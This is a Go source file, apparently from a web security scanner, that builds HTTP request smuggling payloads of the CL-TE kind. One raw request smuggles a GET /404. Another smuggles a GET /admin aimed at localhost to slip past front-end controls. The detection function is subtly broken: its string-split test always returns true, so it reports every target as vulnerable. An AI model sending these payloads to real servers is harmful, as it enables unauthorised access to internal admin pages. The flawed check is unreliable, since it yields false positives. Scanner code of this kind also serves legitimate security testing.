package Smuggling

import (
	"strings"
)

//  1 CL-TE
//  2 CL-TE-TE HTTP request smuggling, obfuscating the TE header
var ClTePayload2 = []string{`POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x`, `POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=`}

func init() {
	for n, x := range ClTePayload2 {
		x = E2EC(x)
		ClTePayload2[n] = x
	}
}

type ClTe2 struct {
	Base
}

func NewCLTE2() *ClTe2 {
	x := &ClTe2{}
	x.Type = "CL-TE2"
	x.Payload = ClTePayload2
	return x
}

// The 2nd payload succeeding means ok
func (r *ClTe2) CheckResponse(body string, payload string) bool {
	a := strings.Split(body, "HTTP/1.1 404")
	if 1 <= len(a) {
		return true
	}
	return false
}

// Condition: the first request's first chunk must be 200
// The first request pushes the second chunk into the queue
// The second request follows that second chunk, so no matter what is sent second, you get a 404, which means the vulnerability exists
func (r *ClTe2) GetTimes() int {
	return 2
}
